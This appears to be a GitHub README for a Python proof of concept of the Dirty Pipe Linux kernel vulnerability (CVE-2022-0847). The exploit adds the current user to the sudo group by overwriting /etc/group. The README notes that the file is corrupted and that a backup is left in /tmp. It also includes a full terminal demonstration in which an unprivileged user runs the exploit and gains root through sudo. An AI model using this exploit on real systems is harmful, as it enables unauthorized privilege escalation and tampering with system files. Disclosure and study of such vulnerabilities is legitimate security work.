# POC Exploit to add user to Sudo for CVE-2022-0847 Dirty Pipe Vulnerability

This repo is based of the Vulnerability, Writeup and Exploit produced by Max Kellermann all found [here](https://dirtypipe.cm4all.com/).

Just like everyone I had to take advantage of playing with the worlds most trivial to repro Priv Esc the blog post does a great job of explaining it all.

I translated the exploit into python simply to get a better feel for it, but this is an exact copy of the C exploit.

## Requires
Python 3.10 (due to use of os.splice call)

## Bad bits
Corrupts the /etc/group file by writing into the line directly following the sudo entry. But when you are root you can fix this using the copy.

Places a copy of /etc/group at /tmp/group_backup

### Demonstation

```sh
test@kali:/home/user/working$ whoami
test
test@kali:/home/user/working$ sudo whoami
test is not in the sudoers file.  This incident will be reported.
test@kali:/home/user/working$ python3.10 poc.py
[*] Dirty PIPE POC [*]
[*] Exploit will add test to sudoers
[*] Finding offset of sudo entry in /etc/group
[*] Found sudo group offset
[*] Confirmed it is not last.
[*] Opening /etc/group
[*] Opening PIPE
[*] Contaminating flags of pipe buffer
[*] 65536 bytes written to pipe
[*] 65536 bytes read from pipe
[*] Splicing byte from /etc/group to pipe
[*] Spliced 1 bytes
[*] Altering group to add test
[*] 6 bytes written to /etc/group
test@kali:/home/user/working$ su test
Password:
test@kali:/home/user/working$ sudo whoami
root
test@kali:/home/user/working$
```